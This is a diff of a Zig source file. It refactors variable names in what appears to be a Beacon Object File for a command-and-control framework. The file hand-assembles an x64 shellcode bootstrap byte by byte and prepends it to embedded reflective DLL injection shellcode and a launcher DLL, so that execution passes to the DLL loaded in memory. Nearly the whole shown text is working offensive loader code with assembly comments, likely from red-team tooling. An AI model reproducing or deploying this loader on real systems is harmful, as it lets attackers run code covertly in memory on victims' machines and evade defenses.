@@ -6,7 +6,7 @@ pub export fn go(arg_data: ?[*]u8, arg_len: i32) callconv(.C) u8 {
     var parser = beacon.datap{};
     beacon.dataParse(&parser, arg_data, arg_len);
 
-    const bof_data = blk: {
+    const bof_bytes = blk: {
         const bof_len = beacon.dataInt(&parser);
 
         // BOF address must be passed like this:
@@ -21,176 +21,169 @@ pub export fn go(arg_data: ?[*]u8, arg_len: i32) callconv(.C) u8 {
     else
         @embedFile("_embed_generated/bof_launcher_win_x64_shared.dll");
 
-    const rdi_shellcode_len = if (@import("builtin").cpu.arch == .x86)
-        rdi_shellcode32_len
+    const rdi_shellcode_bytes = if (@import("builtin").cpu.arch == .x86)
+        rdi_shellcode32[0..rdi_shellcode32_len]
     else
-        rdi_shellcode64_len;
-
-    const rdi_shellcode = if (@import("builtin").cpu.arch == .x86)
-        rdi_shellcode32
-    else
-        rdi_shellcode64;
+        rdi_shellcode64[0..rdi_shellcode64_len];
 
     _ = beacon.printf(0, "ptr: %p len: %d\n%s\n", bof_launcher_bytes.ptr, bof_launcher_bytes.len, rdi_shellcode64);
 
-    var bootstrap: [69]u8 = undefined;
+    var bootstrap_bytes: [69]u8 = undefined;
     var bootstrap_i: usize = 0;
 
     // call 0x5 (pushes next instruction address to stack)
-    bootstrap[bootstrap_i] = 0xe8;
+    bootstrap_bytes[bootstrap_i] = 0xe8;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0x00;
+    bootstrap_bytes[bootstrap_i] = 0x00;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0x00;
+    bootstrap_bytes[bootstrap_i] = 0x00;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0x00;
+    bootstrap_bytes[bootstrap_i] = 0x00;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0x00;
+    bootstrap_bytes[bootstrap_i] = 0x00;
     bootstrap_i += 1;
 
-    const dll_offset = @sizeOf(@TypeOf(bootstrap)) - bootstrap_i + rdi_shellcode_len;
-
-    _ = rdi_shellcode;
+    const dll_offset: u32 = @intCast(@sizeOf(@TypeOf(bootstrap_bytes)) - bootstrap_i + rdi_shellcode_bytes.len);
 
     // pop rcx
-    bootstrap[bootstrap_i] = 0x59;
+    bootstrap_bytes[bootstrap_i] = 0x59;
     bootstrap_i += 1;
 
     // mov r8, rcx
-    bootstrap[bootstrap_i] = 0x49;
+    bootstrap_bytes[bootstrap_i] = 0x49;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0x89;
+    bootstrap_bytes[bootstrap_i] = 0x89;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0xc8;
+    bootstrap_bytes[bootstrap_i] = 0xc8;
     bootstrap_i += 1;
 
     const bof_run_hash: u32 = 0x28fe7d78;
 
     // mov edx, <hash of function name>
-    bootstrap[bootstrap_i] = 0xba;
+    bootstrap_bytes[bootstrap_i] = 0xba;
     bootstrap_i += 1;
-    @memcpy(bootstrap[bootstrap_i..][0..4], @as([*]const u8, @ptrCast(&bof_run_hash))[0..4]);
+    @memcpy(bootstrap_bytes[bootstrap_i..][0..4], @as([*]const u8, @ptrCast(&bof_run_hash))[0..4]);
     bootstrap_i += 4;
 
     const user_data_location: u32 = @intCast(dll_offset + bof_launcher_bytes.len);
 
     // add r8, <offset of the dll> + <length of dll>
-    bootstrap[bootstrap_i] = 0x49;
+    bootstrap_bytes[bootstrap_i] = 0x49;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0x81;
+    bootstrap_bytes[bootstrap_i] = 0x81;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0xc0;
+    bootstrap_bytes[bootstrap_i] = 0xc0;
     bootstrap_i += 1;
-    @memcpy(bootstrap[bootstrap_i..][0..4], @as([*]const u8, @ptrCast(&user_data_location))[0..4]);
+    @memcpy(bootstrap_bytes[bootstrap_i..][0..4], @as([*]const u8, @ptrCast(&user_data_location))[0..4]);
     bootstrap_i += 4;
 
-    const bof_data_len: u32 = @intCast(bof_data.len);
+    const bof_data_len: u32 = @intCast(bof_bytes.len);
 
     // mov r9d, <length of user data>
-    bootstrap[bootstrap_i] = 0x41;
+    bootstrap_bytes[bootstrap_i] = 0x41;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0xb9;
+    bootstrap_bytes[bootstrap_i] = 0xb9;
     bootstrap_i += 1;
-    @memcpy(bootstrap[bootstrap_i..][0..4], @as([*]const u8, @ptrCast(&bof_data_len))[0..4]);
+    @memcpy(bootstrap_bytes[bootstrap_i..][0..4], @as([*]const u8, @ptrCast(&bof_data_len))[0..4]);
     bootstrap_i += 4;
 
     // push rsi
-    bootstrap[bootstrap_i] = 0x56;
+    bootstrap_bytes[bootstrap_i] = 0x56;
     bootstrap_i += 1;
 
     // mov rsi, rsp
-    bootstrap[bootstrap_i] = 0x48;
+    bootstrap_bytes[bootstrap_i] = 0x48;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0x89;
+    bootstrap_bytes[bootstrap_i] = 0x89;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0xe6;
+    bootstrap_bytes[bootstrap_i] = 0xe6;
     bootstrap_i += 1;
 
     // and rsp, 0x0FFFFFFFFFFFFFFF0 (align the stack to 16 bytes)
-    bootstrap[bootstrap_i] = 0x48;
+    bootstrap_bytes[bootstrap_i] = 0x48;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0x83;
+    bootstrap_bytes[bootstrap_i] = 0x83;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0xe4;
+    bootstrap_bytes[bootstrap_i] = 0xe4;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0xf0;
+    bootstrap_bytes[bootstrap_i] = 0xf0;
     bootstrap_i += 1;
 
     // sub rsp, 0x30 (create some breathing room on the stack)
-    bootstrap[bootstrap_i] = 0x48;
+    bootstrap_bytes[bootstrap_i] = 0x48;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0x83;
+    bootstrap_bytes[bootstrap_i] = 0x83;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0xec;
+    bootstrap_bytes[bootstrap_i] = 0xec;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 6 * 8; // 32 bytes for shadow space + 16 bytes for last args
+    bootstrap_bytes[bootstrap_i] = 6 * 8; // 32 bytes for shadow space + 16 bytes for last args
     bootstrap_i += 1;
 
     // mov qword ptr [rsp + 0x20], rcx (shellcode base) - Push in arg 5
-    bootstrap[bootstrap_i] = 0x48;
+    bootstrap_bytes[bootstrap_i] = 0x48;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0x89;
+    bootstrap_bytes[bootstrap_i] = 0x89;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0x4c;
+    bootstrap_bytes[bootstrap_i] = 0x4c;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0x24;
+    bootstrap_bytes[bootstrap_i] = 0x24;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 4 * 8;
+    bootstrap_bytes[bootstrap_i] = 4 * 8;
     bootstrap_i += 1;
 
     // add rcx, <offset of the dll>
-    bootstrap[bootstrap_i] = 0x48;
+    bootstrap_bytes[bootstrap_i] = 0x48;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0x81;
+    bootstrap_bytes[bootstrap_i] = 0x81;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0xc1;
+    bootstrap_bytes[bootstrap_i] = 0xc1;
     bootstrap_i += 1;
-    @memcpy(bootstrap[bootstrap_i..][0..4], @as([*]const u8, @ptrCast(&dll_offset))[0..4]);
+    @memcpy(bootstrap_bytes[bootstrap_i..][0..4], @as([*]const u8, @ptrCast(&dll_offset))[0..4]);
     bootstrap_i += 4;
 
     const rdi_flags: u32 = 0;
 
     // mov dword ptr [rsp + 0x28], <Flags> - Push arg 6 just above shadow space
-    bootstrap[bootstrap_i] = 0xc7;
+    bootstrap_bytes[bootstrap_i] = 0xc7;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0x44;
+    bootstrap_bytes[bootstrap_i] = 0x44;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0x24;
+    bootstrap_bytes[bootstrap_i] = 0x24;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 5 * 8;
+    bootstrap_bytes[bootstrap_i] = 5 * 8;
     bootstrap_i += 1;
-    @memcpy(bootstrap[bootstrap_i..][0..4], @as([*]const u8, @ptrCast(&rdi_flags))[0..4]);
+    @memcpy(bootstrap_bytes[bootstrap_i..][0..4], @as([*]const u8, @ptrCast(&rdi_flags))[0..4]);
     bootstrap_i += 4;
 
     // call - Transfer execution to the RDI
-    bootstrap[bootstrap_i] = 0xe8;
+    bootstrap_bytes[bootstrap_i] = 0xe8;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = @intCast(@sizeOf(@TypeOf(bootstrap)) - bootstrap_i - 4); // Skip over the remainder of instructions
+    bootstrap_bytes[bootstrap_i] = @intCast(@sizeOf(@TypeOf(bootstrap_bytes)) - bootstrap_i - 4); // Skip over the remainder of instructions
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0x00;
+    bootstrap_bytes[bootstrap_i] = 0x00;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0x00;
+    bootstrap_bytes[bootstrap_i] = 0x00;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0x00;
+    bootstrap_bytes[bootstrap_i] = 0x00;
     bootstrap_i += 1;
 
     // mov rsp, rsi - Reset our original stack pointer
-    bootstrap[bootstrap_i] = 0x48;
+    bootstrap_bytes[bootstrap_i] = 0x48;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0x89;
+    bootstrap_bytes[bootstrap_i] = 0x89;
     bootstrap_i += 1;
-    bootstrap[bootstrap_i] = 0xf4;
+    bootstrap_bytes[bootstrap_i] = 0xf4;
     bootstrap_i += 1;
 
     // pop rsi - Put things back where we left them
-    bootstrap[bootstrap_i] = 0x5e;
+    bootstrap_bytes[bootstrap_i] = 0x5e;
     bootstrap_i += 1;
 
     // ret - return to caller
-    bootstrap[bootstrap_i] = 0xc3;
+    bootstrap_bytes[bootstrap_i] = 0xc3;
     bootstrap_i += 1;
 
-    const exit_code = bof_launcher.run(bof_data) catch return 250;
+    const exit_code = bof_launcher.run(bof_bytes) catch return 250;
     return exit_code + 5;
 }
 
